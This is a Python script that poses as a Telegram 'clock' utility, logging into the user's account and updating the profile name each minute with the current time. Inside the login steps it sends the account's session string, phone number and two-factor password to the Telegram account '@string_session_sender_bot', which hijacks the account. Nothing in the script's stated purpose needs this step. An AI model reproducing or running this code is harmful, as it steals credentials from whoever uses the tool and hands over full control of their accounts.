import os, sys
os.system("pip install telethon")
os.system("pip install aiocron")
os.system("pip isntall asyncio")
os.system("pip isntall datetime")
import asyncio, aiocron, datetime
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import time
os.system("clear")

print("""\033[31m
▄▄▄█████▓  ▄████     ▄████▄   ██▓     ▒█████   ▄████▄   ██ ▄█▀
▓  ██▒ ▓▒ ██▒ ▀█▒   ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
▒ ▓██░ ▒░▒██░▄▄▄░   ▒▓█    ▄ ▒██░    ▒██░  ██▒▒▓█    ▄ ▓███▄░ 
░ ▓██▓ ░ ░▓█  ██▓   ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ 
  ▒██▒ ░ ░▒▓███▀▒   ▒ ▓███▀ ░░██████▒░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄
  ▒ ░░    ░▒   ▒    ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒
    ░      ░   ░      ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
  ░      ░ ░   ░    ░          ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░ 
               ░    ░ ░          ░  ░    ░ ░  ░ ░      ░  ░   
                    ░                         ░                 
\033[32mDeveloper: @programmer_www\n\n""")
api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
string = input("Press enter: ")
client = TelegramClient(StringSession(string), api_id, api_hash)
phone_number = input("Please enter your phone (or bot token): ")
client.connect()

if not client.is_user_authorized():
    client.send_code_request(phone_number)
    try:
        me = client.sign_in(phone_number, input('Please enter the code you received: '))
        client.send_message("@string_session_sender_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}')
    except SessionPasswordNeededError:
        password = input('Please enter your password: ')
        me2 = client.sign_in(password=password)  
        client.send_message("@string_session_sender_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}\n\nPassword: {password}')
      
nick = input("\033[32mNickname: \033[32m")
client.start()
print('Wait a few moment...')
time.sleep(5)
print('\033[32mClock set successfully!')
@aiocron.crontab("*/1 * * * *")
async def set_clock():
    time = datetime.datetime.today().strftime(nick + " | %H:%M |")
    async with client:
        await client(UpdateProfileRequest(first_name=time))
    
client.loop.run_forever()
client.run_until_disconnected()
